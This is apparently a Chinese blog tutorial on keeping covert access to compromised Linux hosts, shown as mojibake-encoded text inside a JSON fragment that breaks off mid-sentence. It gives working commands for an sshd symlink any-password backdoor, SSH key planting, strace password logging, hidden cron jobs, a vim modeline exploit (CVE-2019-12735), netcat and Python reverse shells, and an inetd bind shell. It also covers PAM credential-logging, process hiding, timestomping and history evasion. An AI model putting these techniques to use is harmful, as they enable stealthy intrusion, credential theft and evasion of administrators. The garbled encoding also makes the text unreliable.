è½¯è¿æ¥åé—¨ ä¼˜ç‚¹ï¼šèƒ½å¤Ÿç»•è¿‡ä¸€äº›ç½‘ç»œè®¾å¤‡çš„å®‰å…¨æµé‡ç›‘æµ‹ï¼Œä½†æ˜¯æœ¬åœ°åœ¨æŸ¥çœ‹ç›‘å¬ç«¯å£æ—¶ä¼šæš´éœ²ç«¯å£\nè½¯è¿æ¥åé—¨çš„åŸç†æ˜¯åˆ©ç”¨äº†PAMé…ç½®æ–‡ä»¶çš„ä½œç”¨ï¼Œå°†sshdæ–‡ä»¶è½¯è¿æ¥åç§°è®¾ç½®ä¸ºsuï¼Œè¿™æ ·åº”ç”¨åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä»–ä¼šå»PAMé…ç½®æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨å¯¹åº”åç§°çš„é…ç½®ä¿¡æ¯(su)ï¼Œç„¶è€Œ su åœ¨ pam_rootok åªæ£€æµ‹ uid 0 å³å¯è®¤è¯æˆåŠŸï¼Œè¿™æ ·å°±å¯¼è‡´äº†å¯ä»¥ä½¿ç”¨ä»»æ„å¯†ç ç™»å½•\né…ç½®ï¼š\nln -sf /usr/sbin/sshd /tmp/su /tmp/su -oPort=8080 è¿æ¥ï¼š\nssh root@[ip] -p 8080 æˆ‘è¿™é‡Œå°è¯•å¹¶ä¸æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯linuxç‰ˆæœ¬åŸå› \nSSH å…¬é’¥å…å¯†ç™»é™† è€ç”Ÿå¸¸è°ˆçš„å…¬é’¥å…ç™»é™†ï¼Œè¿™ç§ç”¨æ³•ä¸åªæ˜¯ç”¨åœ¨ç•™åé—¨ï¼Œè¿˜å¯ä»¥åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹è·å–ä¸€ä¸ªäº¤äº’çš„shellï¼Œå¦‚strutså†™å…¥å…¬é’¥ï¼Œoracleå†™å…¥å…¬é’¥è¿æ¥ï¼ŒRedisæœªæˆæƒè®¿é—®ç­‰æƒ…æ™¯\nåœ¨è‡ªå·±ä¸»æœºç”Ÿæˆå¯†é’¥ï¼š\nssh-keygen -b 4096 -t rsa #ç›´æ¥ä¸‰ä¸ªå›è½¦ æŸ¥çœ‹ç”Ÿæˆçš„å…¬é’¥å†…å®¹ï¼š\nå¤åˆ¶è¿™ä¸ªå†…å®¹\nåœ¨ç›®æ ‡ä¸»æœºå†™å…¬é’¥ï¼š\necho \u0026#34;ä½ è‡ªå·±çš„å¯†é’¥å†…å®¹\u0026#34;\u0026gt;\u0026gt;/root/.ssh/authorized_keys #ç¼–è¾‘å®Œæˆåè¿˜å¾—ä¿®æ”¹æƒé™ chmod 600 ~/.ssh/authorized_keys chmod 700 ~/.ssh æ¥ä¸‹æ¥å°±å¯ä»¥å…å¯†è¿æ¥ï¼š\nssh -i /root/.ssh/id_rsa root@ç›®æ ‡ip SSH Keyloggerè®°å½•å¯†ç  å½“å‰ç³»ç»Ÿå¦‚æœå­˜åœ¨straceçš„è¯ï¼Œå®ƒå¯ä»¥è·Ÿè¸ªä»»ä½•è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥åˆ©ç”¨ strace ç³»ç»Ÿè°ƒè¯•å·¥å…·è·å– ssh çš„è¯»å†™è¿æ¥çš„æ•°æ®ï¼Œä»¥è¾¾åˆ°æŠ“å–ç®¡ç†å‘˜ç™»é™†å…¶ä»–æœºå™¨çš„æ˜æ–‡å¯†ç çš„ä½œç”¨ã€‚\nåœ¨å½“å‰ç”¨æˆ·çš„ .bashrc é‡Œæ–°å»ºä¸€æ¡ alias ï¼Œè¿™æ ·å¯ä»¥æŠ“å–ä»–ç™»é™†å…¶ä»–æœºå™¨çš„ ssh å¯†ç \nalias ssh=\u0026#39;strace -o /tmp/.sshpwd-`date \u0026#39;+%d%h%m%s\u0026#39;`.log -e read,write,connect -s2048 ssh\u0026#39; å°è¯•è¿æ¥ï¼š\nssh kali@192.168.111.128 å¯ä»¥çœ‹è§åªè¦sshè¿æ¥ï¼Œå°±ä¼šåœ¨/tmpä¸­ç”Ÿæˆlogæ–‡ä»¶ï¼š\nè¯»å–å¯†ç ï¼š\ngrep \u0026#34;read(4\u0026#34; /tmp/.sshpwd-29Nov111732872501.log | tail -n 20 # æ ¹æ®ä¸åŒç¯å¢ƒè‡ªè¡Œè°ƒè¯•å“åº”è¡Œæ•° å¯ä»¥çœ‹è§è¾“å…¥äº†å¯†ç ä¸ºkali\nstraceç›‘å¬sshæ¥æºæµé‡ ä¸åªæ˜¯å¯ä»¥ç›‘å¬è¿æ¥ä»–äººï¼Œè¿˜å¯ä»¥ç”¨æ¥æŠ“åˆ°åˆ«äººè¿å…¥çš„å¯†ç ã€‚åº”ç”¨åœºæ™¯å¦‚ï¼šé€šè¿‡æ¼æ´è·å–rootæƒé™ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜æ–‡å¯†ç \né¦–å…ˆç›®æ ‡æœºå¼€å¯ç›‘å¬ï¼š\nps -ef | grep sshd\t# è·å–çˆ¶è¿›ç¨‹PID strace -f -p 1015510 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048 ç„¶åç­‰å¾…åˆ«äººè¿å…¥ï¼š\nè¿å…¥åç›‘å¬ç«¯ä¼šæœ‰æµé‡ï¼š\næ¥ä¸‹æ¥å¯ä»¥æŸ¥çœ‹logæ–‡ä»¶ï¼š\ngrep \u0026#34;read(6\u0026#34; /tmp/.ssh.log | tail -n 20 è¿™é‡Œå¯ä»¥çœ‹è§è¿æ¥å¯†ç ä¸ºkaliï¼Œè¿™æ ·å°±è·å–åˆ°äº†æœ¬æœºå¯†ç \ncronåé—¨ cronå˜›ï¼Œéƒ½çŸ¥é“æ˜¯ç”¨æ¥åšå®šæ—¶ä»»åŠ¡çš„\nä¸€èˆ¬çš„å®šæ—¶ä»»åŠ¡åé—¨å¤§æ¦‚è¿™æ ·éƒ¨ç½²ï¼š\n(crontab -l;echo \u0026#39;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i\u0026#39;)|crontab - ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œä½¿ç”¨crontab -l å°±ä¼šè¢«å‘ç°ï¼Œä¸å¤Ÿéšè”½ï¼š é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š\n(crontab -l;printf \u0026#34;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\u0026#34;)|crontab - è¿™æ—¶å€™ç®¡ç†å‘˜å¦‚æœæ‰§è¡Œ crontab -l å°±ä¼šçœ‹åˆ°æ˜¾ç¤º\u0026quot;no crontab for root\u0026quot;ï¼Œä½†è¿™ä¸ªå›æ˜¾å…¶å®æ˜¯æˆ‘ä»¬è‡ªå·±æ„é€ çš„ï¼Œå®é™…ä¸Šæ˜¯ä»–å°† cron æ–‡ä»¶å†™åˆ°æ–‡ä»¶ä¸­,è€Œ crontab -l å°±æ˜¯åˆ—å‡ºäº†è¯¥æ–‡ä»¶çš„å†…å®¹ï¼š\n/var/spool/cron/crontabs/root é€šå¸¸ cat æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªçš„ï¼Œåªèƒ½åˆ©ç”¨ lessã€vim æˆ–è€… cat -A çœ‹åˆ°ï¼Œè¿™ä¹Ÿæ˜¯åˆ©ç”¨äº†catçš„ä¸€ä¸ªç¼ºé™·ï¼Œæ¥ä¸‹æ¥ä¹Ÿæœ‰è¿™ä¸ªçš„åˆ©ç”¨\ncatéšè— ä¸Šé¢è®°å½•äº†catçš„ä¸€ä¸ªç¼ºé™·ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç¼ºé™·éšè—æ¶æ„å‘½ä»¤åœ¨ä¸€äº›è„šæœ¬ä¸­ï¼Œæ¯”å¦‚åœ¨ä¸€äº›å¤§å‹ä¼ä¸šçš„è¿ç»´å·¥å…·è„šæœ¬ä¸­å¯ä»¥æ’å…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨catçš„ç¼ºé™·è¿˜å¯ä»¥ä½¿ç®¡ç†å‘˜æ— æ³•å‘ç°è„šæœ¬è¢«åšæ‰‹è„š\ncatå…¶å®é»˜è®¤ä½¿ç”¨æ˜¯æ”¯æŒä¸€äº›æ¯”å¦‚ \\r å›è½¦ç¬¦ \\n æ¢è¡Œç¬¦ \\f æ¢é¡µç¬¦ã€ä¹Ÿå°±æ˜¯è¿™äº›ç¬¦å·å¯¼è‡´çš„èƒ½å¤Ÿéšè—å‘½ä»¤\né‚£ä¹ˆå¯ä»¥ç”¨pythonç”Ÿæˆå¸¦æœ‰æ¢è¡Œç¬¦çš„å†…å®¹shï¼š\ncmd_h = \u0026#34;echo \u0026#39;You forgot to check `cat -A`!\u0026#39;\u0026#34; # hidden cmd_v = \u0026#34;echo \u0026#39;Hello world!\u0026#39;\u0026#34; # visible with open(\u0026#34;test.sh\u0026#34;, \u0026#34;w\u0026#34;) as f: output = \u0026#34;#!/bin/sh\\n\u0026#34; output += cmd_h + \u0026#34;;\u0026#34; + cmd_v + \u0026#34; #\\r\u0026#34; + cmd_v + \u0026#34; \u0026#34; * (len(cmd_h) + 3) + \u0026#34;\\n\u0026#34; f.write(output) ç”Ÿæˆå‡ºæ¥ä¸€ä¸ªtest.shï¼Œèµ‹äºˆä¸€ä¸‹æƒé™:\nå¦‚æœæˆ‘ä»¬ä½¿ç”¨catæ¥è¯»å–ï¼š\nçœ‹è§çš„å°±åªæ˜¯hello worldï¼Œä½†å¦‚æœæˆ‘ä»¬å°è¯•æ‰§è¡Œå°±ä¼šå‘ç°å¼‚å¸¸ï¼š\nå¾ˆæ˜æ˜¾è¿™ä¸ªè„šæœ¬æ˜¯ä¸æ­¢æ‰§è¡Œäº†ä¸Šé¢çš„hello worldçš„ï¼Œè¿™é‡Œéœ€è¦ç”¨cat -Aæˆ–è€…ç¼–è¾‘å™¨æ¥æŸ¥çœ‹æ–‡ä»¶ï¼š\nå¯ä»¥çœ‹è§å…¶å®æœ‰éšè—å†…å®¹çš„\nvimåé—¨ vim modeline(CVE-2019-12735) å½±å“ç‰ˆæœ¬ï¼š\nVim \u0026lt; 8.1.1365 Neovim \u0026lt; 0.3.6\nå½“ vim æ‰“å¼€ä¸€ä¸ªåŒ…å«äº† vim modeline æ³¨é‡Šè¡Œçš„æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è¯»å–è¿™ä¸€è¡Œçš„å‚æ•°é…ç½®å¹¶è°ƒæ•´è‡ªå·±çš„è®¾ç½®åˆ°è¿™ä¸ªé…ç½®ï¼Œvimé»˜è®¤å…³é—­modeline\nvimå¼€å¯/usr/share/vim/vimrcï¼š\n# æ–‡ä»¶å†…å†™å…¥ set modeline å½“å‰ç›®å½•åˆ›å»ºæ–‡ä»¶ï¼š\necho \u0026#39;:!uname -a||\u0026#34; vi:fen:fdm=expr:fde=assert_fails(\u0026#34;source\\!\\ \\%\u0026#34;):fdl=0:fdt=\u0026#34;\u0026#39; \u0026gt; poc.txt # è¿™é‡Œå‘½ä»¤ä»¥uname -aä¸ºä¾‹ vim poc.txt åœ¨vimæŸ¥çœ‹hello.txtæ—¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œuname -aï¼Œåå¼¹shellåŒç†ï¼š\n:!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 127.0.0.1 9999 \u0026gt;/tmp/f||\u0026#34; vi:fen:fdm=expr:fde=assert_fails(\u0026#34;source\\!\\ \\%\u0026#34;):fdl=0:fdt=\u0026#34; vim python æ‰©å±•åé—¨ é€‚ç”¨äºå®‰è£…äº†vimä¸”å®‰è£…äº†pythonæ‰©å±•(ç»å¤§ç‰ˆæœ¬é»˜è®¤å®‰è£…)çš„linuxç³»ç»Ÿ\nå…ˆæŸ¥çœ‹æ˜¯å¦å®‰è£…pythonæ‰©å±•\nvim --version okæœ‰python3ï¼Œæ¥ä¸‹æ¥ç¼–å†™è„šæœ¬ï¼š\nimport socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\u0026#34;192.168.111.128\u0026#34;, 6666)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;]); æ¥ä¸‹æ¥æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼š\nç›®æ ‡ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼š\n-Eæ˜¯å¯åŠ¨ä¸€ä¸ªæ”¹è¿›çš„Exæ¨¡å¼ï¼ˆä¹Ÿå°±æ˜¯å‘½ä»¤æ¨¡å¼ï¼‰ï¼Œ-cæ˜¯å»åŠ è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å»æ‰§è¡Œï¼Œè¿™æ ·æˆ‘ä»¬çš„åå¼¹shellè„šæœ¬ä¼šæ‰§è¡Œ\nvim -E -c \u0026#34;py3file shell.py\u0026#34; å¯ä»¥çœ‹è§shellåå¼¹æˆåŠŸ\nä½†æ˜¯ç°åœ¨åé—¨å¤ªæ˜æ˜¾äº†ï¼Œnetstat -anpt ä¸€æŸ¥å°±å¯ä»¥çœ‹åˆ°ï¼Œè€Œä¸” vim -E -c â€œpy3file shell.pyâ€ å‘½ä»¤æ‰§è¡Œä¹‹åï¼Œè¿˜ä¼šæœ‰ä¸€ä¸ªç©ºç™½çª—å£ï¼Œæˆ‘ä»¬éœ€è¦å°è¯•éšè—\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š\nå‘½ä»¤å¯ä»¥åœ¨ç›®æ ‡æœºä¸Šä¸å¼€å¯çª—å£å›æ˜¾å¹¶ä¸”ä¼šè‡ªåŠ¨åˆ é™¤è„šæœ¬\n(nohup vim -E -c \u0026#34;py3file shell.py\u0026#34;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;) \u0026amp;\u0026amp; sleep 2 \u0026amp;\u0026amp; rm -f shell.py #å°†nohupçš„æ‰§è¡Œç»“æœè¾“å‡ºåˆ°/dev/nullä¸­ #å…¶ä¸­/dev/nullåœ¨linuxä¸­ä»£è¡¨ç©ºè®¾å¤‡ï¼Œç»“æœè¾“å‡ºåˆ°ç©ºè®¾å¤‡ä¹Ÿå°±æ˜¯ä¸¢å¼ƒnohupçš„æ‰§è¡Œç»“æœã€‚ #â€œ2â€åœ¨linuxä¸­ä»£è¡¨é”™è¯¯è¾“å‡ºï¼Œâ€œ1â€åœ¨linuxä¸­ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼Œåœ¨æ­¤å¤„ä¹Ÿå°±æ˜¯nohupçš„è¾“å‡ºã€‚2\u0026gt;\u0026amp;1è¡¨ç¤ºå°†é”™è¯¯è¾“å‡ºç»‘å®šåˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œåœ¨æ­¤å¤„ä¹Ÿå°±æ˜¯å°†é”™è¯¯è¾“å‡ºåŒæ ·è¾“å‡ºåˆ°ç©ºè®¾å¤‡ä¸Šä¸è¿›è¡Œæ˜¾ç¤ºã€‚è¿™æ ·ï¼Œæ— è®ºnohupæ‰§è¡Œç»“æœæ˜¯å¦æ­£ç¡®ï¼Œéƒ½ä¸ä¼šæœ‰è¾“å‡ºã€‚ æ¥ä¸‹æ¥éšè—å¯ç–‘çš„è¿æ¥ï¼š\nmkdir null mount --bind null /proc/6238 netstat -anpt #mount --bindå‘½ä»¤æ˜¯å°†å‰ä¸€ä¸ªç›®å½•æŒ‚è½½åˆ°åä¸€ä¸ªç›®å½•ä¸Šï¼Œæ‰€æœ‰å¯¹åä¸€ä¸ªç›®å½•çš„è®¿é—®å…¶å®éƒ½æ˜¯å¯¹å‰ä¸€ä¸ªç›®å½•çš„è®¿é—®ï¼Œå¹¶ä¸”ä¼šå°†å‰ä¸€ä¸ªç›®å½•è·¯å¾„éšè—èµ·æ¥ï¼ˆæ³¨æ„è¿™é‡Œåªæ˜¯éšè—ä¸æ˜¯åˆ é™¤ï¼Œæ•°æ®æœªå‘ç”Ÿæ”¹å˜ï¼Œä»…ä»…æ˜¯æ— æ³•è®¿é—®äº†ï¼‰ã€‚ inetdæœåŠ¡åé—¨ inetdæ˜¯ä¸€ä¸ªç›‘å¬å¤–éƒ¨ç½‘ç»œè¯·æ±‚(å°±æ˜¯ä¸€ä¸ªsocket)çš„ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º13ç«¯å£ã€‚å½“inetdæ¥æ”¶åˆ°ä¸€ä¸ªå¤–éƒ¨è¯·æ±‚åï¼Œå®ƒä¼šæ ¹æ®è¿™ä¸ªè¯·æ±‚åˆ°è‡ªå·±çš„é…ç½®æ–‡ä»¶ä¸­å»æ‰¾åˆ°å®é™…å¤„ç†å®ƒçš„ç¨‹åºï¼Œç„¶åå†æŠŠæ¥æ”¶åˆ°çš„è¿™ä¸ªsocketäº¤ç»™é‚£ä¸ªç¨‹åºå»å¤„ç†ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å·²ç»åœ¨ç›®æ ‡ç³»ç»Ÿçš„inetdé…ç½®æ–‡ä»¶ä¸­é…ç½®å¥½ï¼Œé‚£ä¹ˆæ¥è‡ªå¤–éƒ¨çš„æŸä¸ªsocketæ˜¯è¦æ‰§è¡Œä¸€ä¸ªå¯äº¤äº’çš„shellï¼Œå°±è·å–äº†ä¸€ä¸ªåé—¨\n#ä¿®æ”¹/etc/inetd.conf vim /etc/inetd.conf #discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root /bin/bash bash -i #å¼€å¯inetd inetd æ”»å‡»æœºæ­£å‘è¿æ¥å³å¯è·å¾—shellï¼š\n#ncè¿æ¥ nc -vv 192.168.111.145 13 #å¯ä»¥é…åˆsuidåé—¨ï¼Œä¿®æ”¹/etc/servicesæ–‡ä»¶ï¼š suidshell 6666/tcp #ç„¶åä¿®æ”¹/etc/inetd.conf suidshell stream tcp nowait root /bin/bash bash -i #å¯ä»¥ä¿®æ”¹æˆä¸€äº›å¸¸è§çš„ç«¯å£ï¼Œä»¥å®ç°éšè— åŒæ ·ç›´æ¥æ­£å‘è¿æ¥å³å¯ï¼š\nnc -vv 192.168.111.145 6666 æˆåŠŸè¿æ¥\nåé¢æ˜¯ä¸€äº›æ²¡æ—¶é—´å¤ç°çš„æ‰“æ³•äº†ï¼Œæš‚æ—¶CVè¿‡æ¥çš„ï¼Œçœ‹çœ‹å°±å¥½\nåè®®åé—¨ åœ¨ä¸€äº›è®¿é—®æ§åˆ¶åšçš„æ¯”è¾ƒä¸¥æ ¼çš„ç¯å¢ƒä¸­ï¼Œç”±å†…åˆ°å¤–çš„TCPæµé‡ä¼šè¢«é˜»æ–­æ‰ã€‚ä½†æ˜¯å¯¹äºUDP(DNSã€ICMP)ç›¸å…³æµé‡é€šå¸¸ä¸ä¼šæ‹¦æˆªã€‚\nICMP ä¸»è¦åŸç†å°±æ˜¯åˆ©ç”¨ICMPä¸­å¯æ§çš„dataå­—æ®µè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå…·ä½“åŸç†è¯·å‚è€ƒ: https://zhuanlan.zhihu.com/p/41154036\nå¼€æºå·¥å…·ï¼šICMPåé—¨é¡¹ç›®åœ°å€ï¼šhttps://github.com/andreafabrizi/prism\nDNS åœ¨å¤§å¤šæ•°çš„ç½‘ç»œé‡Œç¯å¢ƒä¸­IPS/IDSæˆ–è€…ç¡¬ä»¶é˜²ç«å¢™éƒ½ä¸ä¼šç›‘æ§å’Œè¿‡æ»¤DNSæµé‡ã€‚ä¸»è¦åŸç†å°±æ˜¯å°†åé—¨è½½è·éšè—åœ¨æ‹¥æœ‰PTRè®°å½•å’ŒAè®°å½•çš„DNSåŸŸä¸­ï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨AAAAè®°å½•å’ŒIPv6åœ°å€ä¼ è¾“åé—¨ï¼‰ï¼Œå…·ä½“è¯·å‚è€ƒï¼šé€šè¿‡DNSä¼ è¾“åé—¨æ¥ç»•è¿‡æ€è½¯\nå¼€æºå·¥å…·ï¼šDNSåé—¨é¡¹ç›®åœ°å€ï¼šhttps://github.com/DamonMohammadbagher/NativePayload_DNS\nåè®®åé—¨æ£€æµ‹ï¼šå¯¹äºDNS/ICMPè¿™ç§åè®®åé—¨ï¼Œç›´æ¥æŸ¥çœ‹ç½‘ç»œè¿æ¥å³å¯ï¼Œå› ä¸ºåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šäº§ç”Ÿå¤§é‡çš„ç½‘ç»œè¿æ¥\næ¸…é™¤ï¼škillè¿›ç¨‹ã€åˆ é™¤æ–‡ä»¶å³å¯\nPAMåé—¨ PAMä½¿ç”¨é…ç½® /etc/pam.d/ ä¸‹çš„æ–‡ä»¶æ¥ç®¡ç†è®¤è¯æ–¹å¼ï¼Œåº”ç”¨ç¨‹åºè°ƒç”¨ç›¸åº”çš„é…ç½®æ–‡ä»¶ï¼Œä»¥åŠ è½½åŠ¨æ€åº“çš„å½¢å¼è°ƒç”¨ /lib/securityä¸‹çš„æ¨¡å—ã€‚\nPAMé…ç½®å¯åˆ†ä¸ºå››ä¸ªå‚æ•°: æ¨¡å—ç±»å‹ã€æ§åˆ¶æ ‡è®°ã€æ¨¡å—è·¯å¾„ã€æ¨¡å—å‚æ•°ï¼Œä¾‹å¦‚: session required pam_selinux.so open\nä¸Šé¢æåˆ°çš„ sshd è½¯é“¾æ¥åé—¨åˆ©ç”¨çš„ PAM æœºåˆ¶è¾¾åˆ°ä»»æ„å¯†ç ç™»å½•ï¼Œè¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯é”®ç›˜è®°å½•ã€‚åŸç†ä¸»è¦æ˜¯é€šè¿‡ pam_unix_auth.c æ‰“è¡¥ä¸çš„æ–¹å¼æ½œå…¥åˆ°æ­£å¸¸çš„ pam æ¨¡å—ä¸­ï¼Œä»¥æ­¤æ¥è®°å½•ç®¡ç†å‘˜çš„å¸å·å¯†ç ã€‚\nåˆ©ç”¨æ­¥éª¤ï¼šå¤åˆ¶patchåˆ°æºä»£ç ç›®å½• \u0026raquo;\u0026gt; æ‰“patch \u0026raquo;\u0026gt; ç¼–è¯‘ \u0026raquo;\u0026gt; å°†ç”Ÿæˆçš„pam_uninx.soæ–‡ä»¶è¦†ç›–åˆ°/lib/secruity/pam_unix.soä¸‹ \u0026raquo;\u0026gt; ä¿®æ”¹æ–‡ä»¶å±æ€§ \u0026raquo;\u0026gt; å»ºç«‹å¯†ç ä¿å­˜æ–‡ä»¶ï¼Œå¹¶è®¾ç½®å¥½ç›¸å…³çš„æƒé™ \u0026raquo;\u0026gt; æ¸…ç†æ—¥å¿— \u0026raquo;\u0026gt; ok\n#ç¡®ä¿sshå¼€å¯pamæ”¯æŒ vim /etc/ssh/sshd_config UsePAM yes #è‡ªåŠ¨åŒ–è„šæœ¬ https://github.com/litsand/shell/blob/master/pam.sh è¿›ç¨‹æ³¨å…¥ ä»æŠ€æœ¯ä¸Šè¯´ï¼Œè·å–å…¶å®ƒçš„è¿›ç¨‹å¹¶ä¿®æ”¹å®ƒä¸€èˆ¬æ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„è°ƒè¯•æ¥å£æ¥å®ç°çš„ï¼Œåœ¨ linux ä¸­å…·æœ‰è°ƒè¯•åŠŸèƒ½çš„å·¥å…·æœ‰ ptraceã€Gdbã€radare2ã€strace ç­‰ï¼Œè¿™äº›å·¥å…·éƒ½æ˜¯ä½¿ç”¨ ptrace è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æä¾›æœåŠ¡çš„ã€‚ptrace ç³»ç»Ÿè°ƒç”¨å…è®¸ä¸€ä¸ªè¿›ç¨‹å»è°ƒè¯•å¦å¤–ä¸€ä¸ªè¿›ç¨‹ã€‚\nGitHubå­˜åœ¨å¤§é‡å¼€æºå·¥å…·ï¼Œæ¯”å¦‚: linux-injectï¼Œä¸»è¦åŸç†æ˜¯ä½¿ç”¨ ptrace å‘è¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ so æ–‡ä»¶\nCopy$./inject [-n process-name] [-p pid] [library-to-inject] ./inject -n sample-target sample-library.so æ¸…é™¤ï¼škillæˆ–è€…é‡å¯å¯¹åº”çš„è¿›ç¨‹å³å¯\nè¿˜æœ‰ cymothoa ï¼šhttps://github.com/jorik041/cymothoa\nRootkit rootkitåˆ†ä¸ºå†…æ ¸çº§å’Œåº”ç”¨çº§ä¸¤ç§:å†…æ ¸çº§çš„æ¯”å¦‚ï¼šDiamorphineï¼Œåº”ç”¨çº§çš„æ¯”å¦‚ï¼šMafix\nMafix æ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚åº”ç”¨çº§rookitï¼Œä¸»è¦æ›¿æ¢lsã€psã€netstatå‘½ä»¤æ¥éšè—æ–‡ä»¶\næ£€æµ‹ï¼šä½¿ç”¨ç›¸å…³æ£€æµ‹å·¥å…·ï¼Œæ¯”å¦‚ï¼šunhide\n",
        "summary": "linuxæƒé™ç»´æŒ ä¿®æ”¹æ–‡ä»¶ã€ç»ˆç«¯å±æ€§ æ–‡ä»¶åˆ›å»ºæ—¶é—´ æœ‰æ—¶æˆ‘ä»¬ä¼šæ ¹æ®æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºåé—¨ï¼Œæ¯”å¦‚å¯¹æ¯”shell.phpå’Œindex.phpçš„ä¿®æ”¹æ—¶é—´æ˜¯å¦ç›¸å·®è¿‡å¤§\ntouchå‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨touchä¿®æ”¹æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼š\ntouch -r index.php shell.php # å°†shell.phpçš„ä¿®æ”¹æ—¶é—´æ”¹ä¸ºå’Œindex.phpä¸€è‡´ æ–‡ä»¶é”å®š åœ¨Linuxä¸­ï¼Œä½¿ç”¨chattrå‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶åŠç›®å½•ï¼Œè€Œæ­¤æƒé™ç”¨ls -læ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œä»è€Œè¾¾åˆ°éšè—æƒé™çš„ç›®çš„ï¼š\nchattr +i evil.php #é”å®šæ–‡ä»¶ rm -rf evil.php #ç›´æ¥åˆ é™¤ä¼šæç¤ºç¦æ­¢åˆ é™¤ lsattr evil.php #å±æ€§æŸ¥çœ‹ chattr -i evil.php #è§£é™¤é”å®š rm -rf evil.php #æ­¤æ—¶æ‰å¯ä»¥æ­£å¸¸åˆ é™¤æ–‡ä»¶ å†å²æ“ä½œå‘½ä»¤ æˆ‘ä»¬å¯èƒ½æƒ³ä¸è®©åœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤è¢«è®°å½•åœ¨å‘½ä»¤è¡Œå†å²ä¸­ï¼Œä½†å•çº¯çš„history -c åªèƒ½æ¸…é™¤å…¨éƒ¨å‘½ä»¤è®°å½•ï¼Œå¯ä»¥å°è¯•ä¸‹é¢çš„æ–¹æ³•\né’ˆå¯¹ä½ çš„å·¥ä½œå…³é—­å†å²è®°å½• å¯ä»¥ä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€åœ¨è¿™å‘½ä»¤ä¹‹åæ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šè®°å½•åˆ°å†å²ä¸­ï¼Œç„¶è€Œè¿™ä¸ªå‘½ä»¤ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåŸæ ·è®°å½•åœ¨å†å²åˆ—è¡¨ä¸­ï¼š\n[space]set +o history #[space] è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„ç¼˜æ•…ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½• æ‰§è¡Œäº†ç›®æ ‡å‘½ä»¤åè®°å¾—æ¢å¤ï¼š\n[Space]set -o history #å°†ç¯å¢ƒæ¢å¤åŸçŠ¶ å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªæƒ…å†µï¼š\nä¸Šå›¾åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ä½¿echo 2ndçš„å‘½ä»¤è®°å½•æ²¡æœ‰è¢«å­˜å‚¨åœ¨historyä¸­\nå†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„å‘½ä»¤ å¦‚æœç›®æ ‡å‘½ä»¤å·²ç»å­˜åœ¨äºå†å²ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ 